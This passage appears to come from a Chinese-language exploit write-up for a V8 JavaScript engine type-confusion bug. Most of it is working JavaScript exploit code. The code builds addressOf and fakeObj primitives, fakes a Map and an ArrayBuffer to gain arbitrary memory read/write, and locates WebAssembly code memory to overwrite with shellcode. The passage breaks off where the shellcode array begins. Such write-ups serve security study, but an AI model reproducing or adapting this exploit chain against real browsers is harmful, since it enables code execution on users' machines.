+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_map = &#123;<span class="attr">x1</span>:i2f(<span class="number">0xdaba0000daba0000</span>),<span class="attr">x2</span>:i2f(<span class="number">0x1900c60f00000a</span>),<span class="attr">x3</span>:i2f(<span class="number">0x82003ff</span>),<span class="attr">x4</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x5</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x6</span>:<span class="number">0.0</span>&#125;;</span><br><span class="line">fake_map.x4 = i2f(ab_proto_addr+<span class="number">0x1</span>);</span><br><span class="line">fake_map.x5 = i2f(ab_constructor_addr+<span class="number">0x1</span>);;</span><br></pre></td></tr></table></figure>
+<h3 id="fake-ArrayBuffer"><a href="#fake-ArrayBuffer" class="headerlink" title="fake ArrayBuffer"></a>fake ArrayBuffer</h3><p>伪造<code>backing_store</code>只需修改<code>y5</code>即可</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_ab = &#123;<span class="attr">y1</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>+<span class="number">1</span>),<span class="attr">y2</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>+<span class="number">1</span>),<span class="attr">y3</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>+<span class="number">1</span>),<span class="attr">y4</span>:i2f(<span class="number">0x40000000000</span>),<span class="attr">y5</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>),<span class="attr">y6</span>:i2f(<span class="number">0x4</span>)&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="fakeObj"><a href="#fakeObj" class="headerlink" title="fakeObj"></a>fakeObj</h3><p>在<code>callback</code>中<code>arr[0] = {};</code>让<code>arr[0]</code>变为对象，<code>arr[0] = i2f(addr+1)</code>赋值时缺失类型检查，<code>arr[0]</code>处存放的对象地址被改为<code>addr+1</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback,addr</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> x = arr[<span class="number">0</span>];</span><br><span class="line">      callback();</span><br><span class="line">      arr[<span class="number">0</span>] = i2f(addr+<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">      foo(arr,()=&gt;<span class="number">1</span>,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    foo(arr,evil,addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>可以劫持<code>backing_store</code>就可以实现任意地址写</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fakeObj(fake_ab_elements_addr+<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab_obj = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(fake_ab_obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]f addr : "</span> + hex(f_addr));</span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------arbRead/arbWrite------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//hijack the backing_store</span></span><br><span class="line">  fake_ab.y5 = i2f(addr);</span><br><span class="line">  <span class="keyword">var</span> val = data_view.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">//console.log("[+]addr of arbRead is : " + val.toString)</span></span><br><span class="line">  <span class="keyword">return</span> f2i(val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbWrite</span>(<span class="params">addr,payload</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//hijack the backing_store</span></span><br><span class="line">  fake_ab.y5 = i2f(addr);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; payload.length; i++)&#123;</span><br><span class="line">    data_view.setUint8(i,payload[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exp-js-1"><a href="#exp-js-1" class="headerlink" title="exp.js"></a>exp.js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ((<span class="number">1024</span>*<span class="number">1024</span>));i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf8 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf8);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf8);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">u</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> r = [];</span><br><span class="line">  r[<span class="number">0</span>] = <span class="built_in">parseInt</span>(u % <span class="number">0x100000000</span>);</span><br><span class="line">  r[<span class="number">1</span>] = <span class="built_in">parseInt</span>((u - r[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">  u32.set(r);</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = d;</span><br><span class="line">  <span class="keyword">let</span> r = <span class="built_in">Array</span>.from(u32);</span><br><span class="line">  <span class="keyword">return</span> r[<span class="number">1</span>]*<span class="number">0x100000000</span> + r[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>,<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hh = &#123;<span class="attr">b</span>:<span class="number">13.37</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> x = obj.b;</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> obj.b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hh.b = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    foo(hh,()=&gt;<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> addr = f2i(foo(hh,evil))<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------leak maps------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_proto_addr = addressOf(ab.__proto__);</span><br><span class="line"><span class="keyword">var</span> ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]ab proto addr : "</span> + hex(ab_proto_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------fake maps------------------------</span></span><br><span class="line">gc();</span><br><span class="line"><span class="comment">//obj+152-&gt;elements</span></span><br><span class="line"><span class="comment">// var fake_map = [</span></span><br><span class="line"><span class="comment">//     i2f(0),               //how to deal with it</span></span><br><span class="line"><span class="comment">//     i2f(0x1900c60f00000a),</span></span><br><span class="line"><span class="comment">//     i2f(0x82003ff),</span></span><br><span class="line"><span class="comment">//     i2f(ab_proto_addr+1),</span></span><br><span class="line"><span class="comment">//     i2f(ab_constructor_addr+1),</span></span><br><span class="line"><span class="comment">//     i2f(0),</span></span><br><span class="line"><span class="comment">//     i2f(0x1800841500000a),</span></span><br><span class="line"><span class="comment">//     i2f(0x2003ff)</span></span><br><span class="line"><span class="comment">// ];</span></span><br><span class="line"><span class="keyword">var</span> fake_map = &#123;<span class="attr">x1</span>:i2f(<span class="number">0xdaba0000daba0000</span>),<span class="attr">x2</span>:i2f(<span class="number">0x1900c60f00000a</span>),<span class="attr">x3</span>:i2f(<span class="number">0x82003ff</span>),<span class="attr">x4</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x5</span>:<span class="number">-1.1263976280432204e+129</span>,<span class="attr">x6</span>:<span class="number">0.0</span>&#125;;</span><br><span class="line">fake_map.x4 = i2f(ab_proto_addr+<span class="number">0x1</span>);</span><br><span class="line">fake_map.x5 = i2f(ab_constructor_addr+<span class="number">0x1</span>);;</span><br><span class="line">gc();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf1</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hh = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">13.37</span>&#125;;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> x = obj.b;</span><br><span class="line">      callback();</span><br><span class="line">      <span class="keyword">return</span> obj.b;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      hh.b = obj;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">      foo(hh,()=&gt;<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> addr = f2i(foo(hh,evil))<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line">gc();</span><br><span class="line"><span class="comment">// %DebugPrint(fake_map);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> fake_map_addr = addressOf1(fake_map);</span><br><span class="line"><span class="keyword">var</span> fake_map_elements_addr = fake_map_addr + <span class="number">0x8</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]fake map addr : "</span> + hex(fake_map_elements_addr));</span><br><span class="line"><span class="comment">//real element : +0x10</span></span><br><span class="line"><span class="comment">//--------------------fake ArrayBuffer------------------------</span></span><br><span class="line">gc();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf2</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hh = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">13.37</span>,<span class="attr">c</span>:<span class="number">23.33</span>&#125;;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> x = obj.b;</span><br><span class="line">      callback();</span><br><span class="line">      <span class="keyword">return</span> obj.b;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      hh.b = obj;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">      foo(hh,()=&gt;<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> addr = f2i(foo(hh,evil))<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var fake_ab = [</span></span><br><span class="line"><span class="comment">//     i2f(fake_map_elements_addr+0x10+1), //ab_maps</span></span><br><span class="line"><span class="comment">//     i2f(fake_map_elements_addr+0x10+1), //elements</span></span><br><span class="line"><span class="comment">//     i2f(fake_map_elements_addr+0x10+1), //properties</span></span><br><span class="line"><span class="comment">//     i2f(0x4000000000),                  //length</span></span><br><span class="line"><span class="comment">//     i2f(fake_map_elements_addr+0x10),   //backing_store</span></span><br><span class="line"><span class="comment">//     i2f(0x4),</span></span><br><span class="line"><span class="comment">// ];</span></span><br><span class="line"><span class="keyword">let</span> fake_ab = &#123;<span class="attr">y1</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>+<span class="number">1</span>),<span class="attr">y2</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>+<span class="number">1</span>),<span class="attr">y3</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>+<span class="number">1</span>),<span class="attr">y4</span>:i2f(<span class="number">0x40000000000</span>),<span class="attr">y5</span>:i2f(fake_map_elements_addr+<span class="number">0x10</span>),<span class="attr">y6</span>:i2f(<span class="number">0x4</span>)&#125;;</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = addressOf2(fake_ab);</span><br><span class="line"><span class="keyword">var</span> fake_ab_elements_addr = fake_ab_addr + <span class="number">0x8</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]fake ab elements addr : "</span> + hex(fake_ab_elements_addr));</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//wasm method</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule,&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf3</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hh = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">13.37</span>,<span class="attr">c</span>:<span class="number">23.33</span>,<span class="attr">d</span>:<span class="number">44.44</span>,<span class="attr">e</span>:<span class="number">55.55</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> x = obj.b;</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> obj.b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hh.b = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    foo(hh,()=&gt;<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> addr = f2i(foo(hh,evil))<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf3(f);</span><br><span class="line"><span class="comment">// %DebugPrint(f);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="comment">//--------------------fake Obj------------------------</span></span><br><span class="line">arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback,addr</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> x = arr[<span class="number">0</span>];</span><br><span class="line">      callback();</span><br><span class="line">      arr[<span class="number">0</span>] = i2f(addr+<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">      foo(arr,()=&gt;<span class="number">1</span>,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    foo(arr,evil,addr);</span><br><span class="line">    <span class="comment">//%DebugPrint(ab);</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arr);</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arr[0]);</span></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line">&#125;</span><br><span class="line">fakeObj(fake_ab_elements_addr+<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab_obj = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(fake_ab_obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]f addr : "</span> + hex(f_addr));</span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------arbRead/arbWrite------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//hijack the backing_store</span></span><br><span class="line">  fake_ab.y5 = i2f(addr);</span><br><span class="line">  <span class="keyword">var</span> val = data_view.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">//console.log("[+]addr of arbRead is : " + val.toString)</span></span><br><span class="line">  <span class="keyword">return</span> f2i(val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbWrite</span>(<span class="params">addr,payload</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//hijack the backing_store</span></span><br><span class="line">  fake_ab.y5 = i2f(addr);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; payload.length; i++)&#123;</span><br><span class="line">    data_view.setUint8(i,payload[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbRead(f_addr+<span class="number">0x20</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]shared info addr : "</span> + hex(shared_info_addr));</span><br><span class="line"><span class="keyword">var</span> code_addr = arbRead(shared_info_addr+<span class="number">8</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]code addr : "</span> + hex(code_addr));</span><br><span class="line"><span class="keyword">var</span> wasm_code_addr = code_addr+(<span class="number">0x100</span><span class="number">-0xa0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]wasm code addr : "</span> + hex(wasm_code_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc=[<span 